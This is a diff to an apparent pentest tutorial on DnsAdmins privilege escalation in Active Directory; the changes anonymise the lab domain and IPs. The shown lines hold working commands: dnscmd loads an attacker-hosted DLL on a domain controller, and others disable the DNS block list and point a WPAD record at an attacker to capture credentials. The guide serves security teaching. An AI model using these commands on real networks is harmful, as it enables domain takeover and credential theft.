@@ -53,7 +53,7 @@ DnsAdmins is therefore treated as a tier-0 group in any sound AD security model,
 ```cmd
 C:\> whoami /groups | findstr -i dnsadmins
 
-INLANEFREIGHT\DnsAdmins                Group            S-1-5-21-...-1106 Mandatory group, Enabled by default
+EXAMPLE\DnsAdmins                Group            S-1-5-21-...-1106 Mandatory group, Enabled by default
 ```
 
 Or query AD directly:
@@ -61,7 +61,7 @@ Or query AD directly:
 ```powershell
 PS> Get-ADGroupMember -Identity DnsAdmins
 
-distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+distinguishedName : CN=netadm,CN=Users,DC=EXAMPLE,DC=LOCAL
 name              : netadm
 objectClass       : user
 objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
@@ -136,7 +136,7 @@ The path used in `ServerLevelPluginDll` must be readable by the DNS service (whi
 
 A network share path (`\\attacker\share\adduser.dll`) also works because the DC machine account can read attacker-controlled SMB shares - but this generates extra noise and may fail in environments with SMB egress filtering.
 
-For the canonical Inlanefreight-style scenario where `netadm` is a domain user member of DnsAdmins with RDP to a member server:
+For the canonical Example-style scenario where `netadm` is a domain user member of DnsAdmins with RDP to a member server:
 
 ```cmd
 C:\> copy adduser.dll C:\Users\netadm\Desktop\adduser.dll
@@ -186,7 +186,7 @@ The full absolute path is required - relative paths and PATH-style lookups fail.
 If you have DnsAdmins on the domain but not interactive access to the DC, `dnscmd` accepts a remote DC as the first argument:
 
 ```cmd
-C:\> dnscmd.exe DC01.inlanefreight.local /config /serverlevelplugindll \\10.10.14.3\share\adduser.dll
+C:\> dnscmd.exe DC01.example.local /config /serverlevelplugindll \\10.10.14.3\share\adduser.dll
 ```
 
 This is the variant most useful for engagements where DnsAdmins membership exists on a workstation that doesn't itself host DNS - write to the DC remotely.
@@ -280,7 +280,7 @@ This attack is destructive - both because the DNS service may be left in a non-f
 ### Removing the registry value
 
 ```cmd
-C:\> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+C:\> reg query \\10.0.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
 
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
     GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
@@ -288,7 +288,7 @@ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
     Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
     ServerLevelPluginDll    REG_SZ    C:\Users\netadm\Desktop\adduser.dll
 
-C:\> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
+C:\> reg delete \\10.0.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
 
 Delete the registry value ServerLevelPluginDll (Yes/No)? Y
 The operation completed successfully.
@@ -341,22 +341,22 @@ DnsAdmins members can disable the block list, which re-enables WPAD-based attack
 ### Disabling the block list
 
 ```powershell
-PS> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
+PS> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.example.local
 ```
 
 Or via the legacy interface:
 
 ```cmd
-C:\> dnscmd.exe DC01.inlanefreight.local /config /enableglobalqueryblocklist 0
+C:\> dnscmd.exe DC01.example.local /config /enableglobalqueryblocklist 0
 ```
 
 ### Creating the WPAD record
 
 ```powershell
-PS> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
+PS> Add-DnsServerResourceRecordA -Name wpad -ZoneName example.local -ComputerName dc01.example.local -IPv4Address 10.10.14.3
 ```
 
-The IP points at the attacker host. Now domain clients resolving `wpad.inlanefreight.local` (which they do automatically on network join) will direct their web traffic to the attacker.
+The IP points at the attacker host. Now domain clients resolving `wpad.example.local` (which they do automatically on network join) will direct their web traffic to the attacker.
 
 ### Capturing credentials
 
